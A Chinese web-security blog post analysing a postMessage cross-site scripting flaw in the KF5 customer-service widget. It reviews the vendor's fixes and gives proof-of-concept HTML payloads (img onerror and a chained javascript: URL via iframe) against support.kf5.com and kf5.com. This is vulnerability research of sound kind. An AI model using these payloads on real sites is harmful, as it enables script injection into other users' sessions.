<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8">
  
  <title>逸创云客服系统 鸡肋xss分析 | 雨了个雨&#39;s blog</title>

  
  <meta name="author" content="雨了个雨">
  

  
  <meta name="description" content="Focus On Web Security">
  

  
  
  <meta name="keywords" content="Web">
  

  <meta id="viewport" name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black">

  <meta property="og:title" content="逸创云客服系统 鸡肋xss分析"/>

  <meta property="og:site_name" content="雨了个雨&#39;s blog"/>

  
  <meta property="og:image" content="/favicon.ico"/>
  

  <link href="/favicon.ico" rel="icon">
  <link rel="alternate" href="/atom.xml" title="雨了个雨&#39;s blog" type="application/atom+xml">
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
<meta name="generator" content="Hexo 5.2.0"></head>


<body>
<div class="blog">
  <div class="content">

    <header>
  <div class="site-branding">
    <h1 class="site-title">
      <a href="/">雨了个雨&#39;s blog</a>
    </h1>
    <p class="site-description"></p>
  </div>
  <nav class="site-navigation">
    <ul>
      
        <li><a href="/">Home</a></li>
      
        <li><a href="/archives">Archives</a></li>
      
        <li><a href="/friends">Friends</a></li>
      
    </ul>
  </nav>
</header>

    <main class="site-main posts-loop">
    <article>

  
    
    <h3 class="article-title"><span>逸创云客服系统 鸡肋xss分析</span></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2019/03/08/逸创云客服-鸡肋xss分析/" rel="bookmark">
        <time class="entry-date published" datetime="2019-03-08T11:53:54.000Z">
          2019-03-08
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>一套云客服系统, 以前我salt哥教我挖的xss, 自己以前做测试的时候遇到过几次用这系统的 打poc都能成功, 不过最近又遇到了一个, 尝试用以前的poc打的时候,发现失败了。看了一下最新的代码, 发现已经修复了。<br>修复方法为<br>1: 限制了postmessage的来源必须是support.kf5.com<br>2: showNotice方法当中, 把innerHTML改成了innerText<br>尝试绕过了一下, 算是失败了吧。</p>
<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>这里首先以官网(<a target="_blank" rel="noopener" href="http://www.kf5.com/">http://www.kf5.com</a>) 为例测试一下, 直接看看修复后的代码<br>每一个要使用这套云客户系统的客户, 都需要引入一个js文件。<br><a target="_blank" rel="noopener" href="http://assets-cdn.kf5.com//supportbox//main.js">http://assets-cdn.kf5.com//supportbox//main.js</a></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span></span><br><span class="line"><span class="handlebars"><span class="xml">    document.write(&#x27;<span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;\/\/assets-cdn.kf5.com\/supportbox\/main.js?&#x27; + (new Date).getDay() + &#x27;&quot;</span> <span class="attr">id</span>=<span class="string">&quot;kf5-provide-supportBox&quot;</span> <span class="attr">kf5-domain</span>=<span class="string">&quot;support.kf5.com&quot;</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span><span class="handlebars"><span class="xml"><span class="tag">&lt;<span class="name">\</span>/<span class="attr">script</span>&gt;</span>&#x27;);</span></span></span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>在这个js文件当中,  </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> easing = &#123;</span><br><span class="line">    swing: <span class="function"><span class="keyword">function</span> (<span class="params">t</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">.5</span> - <span class="built_in">Math</span>.cos(t * <span class="built_in">Math</span>.PI) / <span class="number">2</span></span><br><span class="line">    &#125;, <span class="attr">linear</span>: <span class="function"><span class="keyword">function</span> (<span class="params">t</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> t</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">setup(), autoPopupService()</span><br></pre></td></tr></table></figure>
<p>调用了setup方法, </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">setup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    bindEvent(<span class="built_in">window</span>, <span class="string">&quot;DOMContentLoaded&quot;</span>, KF5SupportBox.loadConfig), bindEvent(<span class="built_in">window</span>, <span class="string">&quot;load&quot;</span>, KF5SupportBox.loadConfig), bindEvent(<span class="built_in">window</span>.document, <span class="string">&quot;page:load&quot;</span>, KF5SupportBox.loadConfig), bindEvent(<span class="built_in">window</span>.document, <span class="string">&quot;onreadystatechange&quot;</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="string">&quot;complete&quot;</span> === <span class="built_in">window</span>.document.readyState &amp;&amp; KF5SupportBox.loadConfig()</span><br><span class="line">    &#125;), <span class="built_in">window</span>.initializeKF5SupportBox || (<span class="built_in">window</span>.initializeKF5SupportBox = KF5SupportBox.loadConfig), bindEvent(<span class="built_in">window</span>, <span class="string">&quot;message&quot;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">t</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> e, n, o;</span><br><span class="line">        <span class="keyword">if</span> (t.origin.match(<span class="regexp">/^https?:\/\/(.*)$/</span>)[<span class="number">1</span>] === kf5Domain) <span class="keyword">if</span> (t.data &amp;&amp; <span class="string">&quot;string&quot;</span> == <span class="keyword">typeof</span> t.data &amp;&amp; (e = t.data.match(<span class="regexp">/^([^ ]+)(?: +(.*))?/</span>), n = e[<span class="number">1</span>], o = e[<span class="number">2</span>]), <span class="string">&quot;CMD::showSupportbox&quot;</span> === n) KF5SupportBox.instance &amp;&amp; (KF5SupportBox.instance.open(), KF5SupportBox.instance.hideButton()); <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&quot;CMD::hideSupportbox&quot;</span> === n) KF5SupportBox.instance &amp;&amp; KF5SupportBox.instance.close(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">            KF5SupportBox.instance.showButton()</span><br><span class="line">        &#125;); <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&quot;CMD::resizeIframe&quot;</span> === n) ; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&quot;CMD::kf5Notice&quot;</span> === n) KF5SupportBox.instance &amp;&amp; KF5SupportBox.instance.showNotice(o &amp;&amp; <span class="built_in">JSON</span>.parse(o)); <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&quot;CMD::newMsgCountNotice&quot;</span> === n) &#123;</span><br><span class="line">            <span class="keyword">if</span> (KF5SupportBox.instance) &#123;</span><br><span class="line">                <span class="keyword">var</span> i = KF5SupportBox.instance.getElement(<span class="string">&quot;#msg-number&quot;</span>);</span><br><span class="line">                o = <span class="built_in">parseInt</span>(o), o ? (i.style.display = <span class="string">&quot;block&quot;</span>, i.innerHTML = o &lt; <span class="number">10</span> ? o : <span class="string">&quot;...&quot;</span>) : (i.style.display = <span class="string">&quot;none&quot;</span>, i.innerHTML = <span class="string">&quot;&quot;</span>)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&quot;CMD::showImage&quot;</span> === n) &#123;</span><br><span class="line">            <span class="keyword">if</span> (KF5SupportBox.instance) &#123;</span><br><span class="line">                <span class="keyword">var</span> s = KF5SupportBox.instance.getElement(<span class="string">&quot;#kf5-view-image&quot;</span>),</span><br><span class="line">                    a = KF5SupportBox.instance.getElement(<span class="string">&quot;#kf5-backdrop&quot;</span>), r = s.parentNode || s.parentElement;</span><br><span class="line">                o = o ? <span class="built_in">JSON</span>.parse(o) : &#123;&#125;, a.style.display = <span class="string">&quot;block&quot;</span>, r.setAttribute(<span class="string">&quot;href&quot;</span>, o.url), r.setAttribute(<span class="string">&quot;title&quot;</span>, o.name || <span class="string">&quot;&quot;</span>), s.setAttribute(<span class="string">&quot;src&quot;</span>, o.url), s.setAttribute(<span class="string">&quot;alt&quot;</span>, o.name || <span class="string">&quot;&quot;</span>)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="string">&quot;CMD::iframeReady&quot;</span> === n &amp;&amp; KF5SupportBox.instance.onIframeReady()</span><br><span class="line">    &#125;), <span class="string">&quot;string&quot;</span> == <span class="keyword">typeof</span> lang &amp;&amp; lang &amp;&amp; KF5SupportBoxAPI.ready(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        KF5SupportBoxAPI.useLang(lang)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在setup方法当中, 可以看到监听了window对象的message事件, 但是限制了来源(修复1), 在来源符合要求的情况下直接往这个页面postmessage就可以触发这个事件了。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (t.origin.match(<span class="regexp">/^https?:\/\/(.*)$/</span>)[<span class="number">1</span>] === kf5Domain) <span class="keyword">if</span> (t.data &amp;&amp; <span class="string">&quot;string&quot;</span> == <span class="keyword">typeof</span> t.data &amp;&amp; (e = t.data.match(<span class="regexp">/^([^ ]+)(?: +(.*))?/</span>), n = e[<span class="number">1</span>], o = e[<span class="number">2</span>])</span><br></pre></td></tr></table></figure>
<p>判断了postmessage的来源是不是kf5Domain, 如果是的话,才会进入下一个if然后再给n、o变量赋值。 如果不是的话, 没法进入if, n、o变量就都为两个未初始化的变量, 就利用不上了。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">script = <span class="built_in">window</span>.document.getElementById(<span class="string">&quot;kf5-provide-supportBox&quot;</span>),</span><br><span class="line">        parts = script.src.split(<span class="string">&quot;//&quot;</span>), assetsHost = parts.length &gt; <span class="number">1</span> ? parts[<span class="number">1</span>].split(<span class="string">&quot;/&quot;</span>)[<span class="number">0</span>] : <span class="string">&quot;assets.kf5.com&quot;</span>,</span><br><span class="line">        kf5Domain = script.getAttribute(<span class="string">&quot;kf5-domain&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>kf5Domain来自id为kf5-provide-supportBox的标签的kf5-domain属性。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;//assets-cdn.kf5.com/supportbox_v2/main.js?v=20170307&quot;</span> <span class="attr">id</span>=<span class="string">&quot;kf5-provide-supportBox&quot;</span> <span class="attr">kf5-domain</span>=<span class="string">&quot;support.kf5.com&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>所以kf5-domain就为support.kf5.com。 这里我们需要找一个support.kf5.com的xss才能接着看这个postmessage了。</p>
<p>找support.kf5.com的xss, 我还是首先看看有没有类似的postmessage造成的xss<br><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/sx_1.jpg" alt="-w1299"></p>
<p>一共监听了三个message事件, 在查看第一个的时候就发现了存在xss.<br><a target="_blank" rel="noopener" href="https://assets-cdn.kf5.com/supportbox_v2/main.js?v=20170307">https://assets-cdn.kf5.com/supportbox_v2/main.js?v=20170307</a></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">window</span>.initializeKF5SupportBox || (<span class="built_in">window</span>.initializeKF5SupportBox = KF5SupportBox.loadConfig),</span><br><span class="line">    bindEvent(<span class="built_in">window</span>, <span class="string">&quot;message&quot;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">t</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> e, i, n;</span><br><span class="line">        <span class="keyword">if</span> (t.data &amp;&amp; <span class="string">&quot;string&quot;</span> == <span class="keyword">typeof</span> t.data &amp;&amp; (e = t.data.match(<span class="regexp">/^([^ ]+)(?: +(.*))?/</span>),</span><br><span class="line">            i = e[<span class="number">1</span>],</span><br><span class="line">            n = e[<span class="number">2</span>]),</span><br><span class="line">        <span class="string">&quot;CMD::showSupportbox&quot;</span> === i)</span><br><span class="line">            KF5SupportBox.instance &amp;&amp; (KF5SupportBox.instance.open(),</span><br><span class="line">                KF5SupportBox.instance.hideButton());</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&quot;CMD::hideSupportbox&quot;</span> === i)</span><br><span class="line">            KF5SupportBox.instance &amp;&amp; KF5SupportBox.instance.close(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">                KF5SupportBox.instance.showButton()</span><br><span class="line">            &#125;);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&quot;CMD::resizeIframe&quot;</span> === i)</span><br><span class="line">            ;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&quot;CMD::kf5Notice&quot;</span> === i)</span><br><span class="line">            KF5SupportBox.instance &amp;&amp; KF5SupportBox.instance.showNotice(n &amp;&amp; <span class="built_in">JSON</span>.parse(n));</span><br></pre></td></tr></table></figure>
<p>这个文件和之前未修复的文件很像, 没有限制来源。</p>
<p>再对传递过来的message数据通过正则以第一个空格分为两组, n变量为空格之前的字符, o变量为空格之后的字符。<br>n变量是用来选择进入哪个分支的, 这里看一下CMD::kf5Notice分支, 在进入CMD::kf5Notice分支之后会继续执行</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&quot;CMD::kf5Notice&quot;</span> === n) </span><br><span class="line">KF5SupportBox.instance &amp;&amp; KF5SupportBox.instance.showNotice(o &amp;&amp; <span class="built_in">JSON</span>.parse(o));</span><br></pre></td></tr></table></figure>
<p>这里对o变量从字符串解析到JSON之后, 作为参数传递到了showNotice方法。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">showNotice: <span class="function"><span class="keyword">function</span>(<span class="params">t</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> e = <span class="built_in">this</span></span><br><span class="line">        , i = <span class="built_in">window</span>.document.createElement(<span class="string">&quot;div&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> t = <span class="string">&quot;object&quot;</span> == <span class="keyword">typeof</span> t ? t : &#123;&#125;,</span><br><span class="line">        i.innerHTML = <span class="built_in">this</span>.getOpt(<span class="string">&quot;noticeTemplate&quot;</span>).replace(<span class="string">&quot;&#123;&#123;title&#125;&#125;&quot;</span>, t.title || <span class="string">&quot;提示信息&quot;</span>).replace(<span class="string">&quot;&#123;&#123;content&#125;&#125;&quot;</span>, t.content || <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;&#123;&#123;avatar&#125;&#125;&quot;</span>, t.avatar || <span class="built_in">this</span>.getOpt(<span class="string">&quot;defaultNoticeAvatar&quot;</span>)).replace(<span class="string">&quot;&#123;&#123;submitText&#125;&#125;&quot;</span>, t.submitText || <span class="string">&quot;接受&quot;</span>).replace(<span class="string">&quot;&#123;&#123;cancelText&#125;&#125;&quot;</span>, t.cancelText || <span class="string">&quot;拒绝&quot;</span>),</span><br><span class="line">        <span class="built_in">this</span>.closeNotice(),</span><br><span class="line">        <span class="built_in">this</span>.noticeElement = i,</span><br><span class="line">        <span class="number">1</span> === <span class="built_in">this</span>.getOpt(<span class="string">&quot;version&quot;</span>) ? <span class="built_in">document</span>.body.appendChild(i) : <span class="built_in">this</span>.el &amp;&amp; <span class="built_in">this</span>.el.appendChild(i),</span><br><span class="line">        bindEvent(<span class="built_in">document</span>.getElementById(<span class="string">&quot;kf5-support-message-accept&quot;</span>), <span class="string">&quot;click&quot;</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            e.open(),</span><br><span class="line">                e.hideButton(),</span><br><span class="line">            e.iframe &amp;&amp; e.iframe.contentWindow &amp;&amp; e.iframe.contentWindow.postMessage(<span class="string">&quot;CMD::kf5NoticeAccepted &quot;</span> + <span class="built_in">JSON</span>.stringify(t.data), <span class="string">&quot;*&quot;</span>),</span><br><span class="line">                e.closeNotice()</span><br><span class="line">        &#125;),</span><br><span class="line">        bindEvent(<span class="built_in">document</span>.getElementById(<span class="string">&quot;kf5-support-message-reject&quot;</span>), <span class="string">&quot;click&quot;</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            e.iframe &amp;&amp; e.iframe.contentWindow &amp;&amp; e.iframe.contentWindow.postMessage(<span class="string">&quot;CMD::kf5NoticeRejected &quot;</span> + <span class="built_in">JSON</span>.stringify(t.data), <span class="string">&quot;*&quot;</span>),</span><br><span class="line">                e.closeNotice()</span><br><span class="line">        &#125;),</span><br><span class="line">        i</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>showNotice方法中, 使用传入进来的json对模板中的变量进行替换之后, 直接就进行innerHTML了, 可以直接xss。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">id</span>=<span class="string">&quot;demo&quot;</span> <span class="attr">src</span>=<span class="string">&quot;http://support.kf5.com&quot;</span> <span class="attr">width</span>=<span class="string">&quot;0&quot;</span> <span class="attr">height</span>=<span class="string">&quot;0&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> popup = demo.contentWindow;</span></span><br><span class="line"><span class="handlebars"><span class="xml">        var msg = &#x27;CMD::kf5Notice &#123;&quot;content&quot;: &quot;<span class="tag">&lt;<span class="name">img</span>/<span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(document.domain)</span> /&gt;</span>&quot;&#125;&#x27;</span></span></span><br><span class="line"><span class="javascript">        popup.postMessage(msg, <span class="string">&quot;*&quot;</span>);</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/sx_2.jpg" alt="-w1019"></p>
<p>但是这里只是<a target="_blank" rel="noopener" href="https://assets-cdn.kf5.com/supportbox_v2/main.js">https://assets-cdn.kf5.com/supportbox_v2/main.js</a> 的xss而已, 其他客户引入的js都是<a target="_blank" rel="noopener" href="http://assets-cdn.kf5.com//supportbox//main.js">http://assets-cdn.kf5.com//supportbox//main.js</a> 。 所以继续尝试看看能不能使用supportbox_v2的xss来触发supportbox的xss。<br>现在找到了support.kf5.com的xss, 可以通过postmessage的来源判断了。<br>再继续往下看supportbox/main.js。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">showNotice: <span class="function"><span class="keyword">function</span> (<span class="params">t</span>) </span>&#123;</span><br><span class="line">            <span class="function"><span class="keyword">function</span> <span class="title">e</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">                o.open(), o.hideButton(), o.iframe &amp;&amp; o.iframe.contentWindow &amp;&amp; o.iframe.contentWindow.postMessage(<span class="string">&quot;CMD::kf5NoticeAccepted &quot;</span> + <span class="built_in">JSON</span>.stringify(t.data), <span class="string">&quot;*&quot;</span>), o.closeNotice()</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">var</span> n, o = <span class="built_in">this</span>;</span><br><span class="line">            <span class="keyword">return</span> t = <span class="string">&quot;object&quot;</span> == <span class="keyword">typeof</span> t ? t : &#123;&#125;, n = renderTemplate(<span class="built_in">this</span>.getOpt(<span class="string">&quot;noticeTemplate&quot;</span>), &#123;</span><br><span class="line">                noticeTitle: t.title || <span class="string">&quot;æç¤ºä¿¡æ¯&quot;</span>,</span><br><span class="line">                noticeContent: t.content || <span class="string">&quot;&quot;</span>,</span><br><span class="line">                noticeAvatar: t.avatar || <span class="built_in">this</span>.getOpt(<span class="string">&quot;defaultNoticeAvatar&quot;</span>),</span><br><span class="line">                noticeAccept: t.submitText || <span class="string">&quot;æŽ¥å—&quot;</span>,</span><br><span class="line">                noticeReject: t.cancelText || <span class="string">&quot;æ‹’ç»&quot;</span></span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>
<p>supportbox中的showNotice并没有像supportbox_v2一样直接replace变量后就innerHTML, 而是使用了renderTemplate。(修复2）</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">renderTemplate</span>(<span class="params">t, e, n</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> o, i = <span class="built_in">document</span>.createElement(<span class="string">&quot;div&quot;</span>);</span><br><span class="line">    i.innerHTML = t;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> s <span class="keyword">in</span> e) e.hasOwnProperty(s) &amp;&amp; (o = i.getElementsByClassName ? i.getElementsByClassName(<span class="string">&quot;kf5-tpl-&quot;</span> + s) : getElementsByClassName(i, <span class="string">&quot;kf5-tpl-&quot;</span> + s), (o = o.length ? o[<span class="number">0</span>] : <span class="literal">null</span>) &amp;&amp; (n &amp;&amp; <span class="string">&quot;function&quot;</span> == <span class="keyword">typeof</span> n[s] ? n[s](o, e[s]) : <span class="string">&quot;string&quot;</span> == <span class="keyword">typeof</span> o.textContent ? o.textContent = e[s] : o.innerText = e[s]));</span><br><span class="line">    <span class="keyword">return</span> i</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>而在renderTemplate当中, 使用的是innerText, 所以不能xss。<br>这里就只有选择其他的分支尝试xss, 但是看完了几个分支, 都没有合适的点可以xss, 只找到了一个地方能够点击xss(实在没啥用,并且我都不知道咋样才能点到这个a标签)。   </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&quot;CMD::showImage&quot;</span> === n) &#123;</span><br><span class="line">                <span class="keyword">if</span> (KF5SupportBox.instance) &#123;</span><br><span class="line">                    <span class="keyword">var</span> s = KF5SupportBox.instance.getElement(<span class="string">&quot;#kf5-view-image&quot;</span>),</span><br><span class="line">                        a = KF5SupportBox.instance.getElement(<span class="string">&quot;#kf5-backdrop&quot;</span>), r = s.parentNode || s.parentElement;</span><br><span class="line">                    o = o ? <span class="built_in">JSON</span>.parse(o) : &#123;&#125;, a.style.display = <span class="string">&quot;block&quot;</span>, r.setAttribute(<span class="string">&quot;href&quot;</span>, o.url), r.setAttribute(<span class="string">&quot;title&quot;</span>, o.name || <span class="string">&quot;&quot;</span>), s.setAttribute(<span class="string">&quot;src&quot;</span>, o.url), s.setAttribute(<span class="string">&quot;alt&quot;</span>, o.name || <span class="string">&quot;&quot;</span>)</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>
<p>在CMD::showImage分支下, 可以设置#kf5-view-image的alt/src属性。<br>可以设置#kf5-view-image标签的父节点的href/title属性。<br><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/sx_3.jpg" alt="-w478"><br>kf5-view-image标签是img标签, 他的父节点是a标签。 所以可以通过父节点的href属性进行点击xss。<br><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/sx_4.jpg" alt="-w1381"></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">id</span>=<span class="string">&quot;demo&quot;</span> <span class="attr">src</span>=<span class="string">&quot;http://support.kf5.com&quot;</span> <span class="attr">width</span>=<span class="string">&quot;100%&quot;</span> <span class="attr">height</span>=<span class="string">&quot;100%&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="handlebars"><span class="xml">        var content = `<span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">https://www.kf5.com/</span> <span class="attr">id</span>=<span class="string">demo2</span> <span class="attr">onload</span>=<span class="string">&#x27;var popup2 = demo2.contentWindow;var msg2 =\\\&quot;CMD::showImage &#123;\\\\\\&quot;url\\\\\\&quot;:\\\\\\&quot;javascript:alert(document.domain)\\\\\\&quot;&#125;\\\&quot;;popup2.postMessage(msg2, \\\&quot;*\\\&quot;); &#x27;</span>&gt;</span>`</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> popup = demo.contentWindow;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> msg = <span class="string">`CMD::kf5Notice &#123;&quot;content&quot;: &quot;<span class="subst">$&#123;content&#125;</span>&quot;&#125;`</span></span></span><br><span class="line"><span class="javascript">        popup.postMessage(msg, <span class="string">&quot;*&quot;</span>);</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><p><a target="_blank" rel="noopener" href="https://5alt.me/">https://5alt.me/</a></p>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    

    
    

    <span class="post-tags">
      <i class="icon-tags"></i>
        <a href="/tags/Web/">Web</a>
    </span>
    

    </div>

    
  </div>
</article>

  






    </main>

    <footer class="site-footer">
  <p class="site-info">
    Proudly powered by <a href="https://hexo.io/" target="_blank">Hexo</a> and
    Theme by <a href="https://github.com/CodeDaraW/Hacker" target="_blank">Hacker</a>
    </br>
    
    &copy; 2024 雨了个雨
    
  </p>
</footer>
    
    
  </div>
</div>
</body>
</html>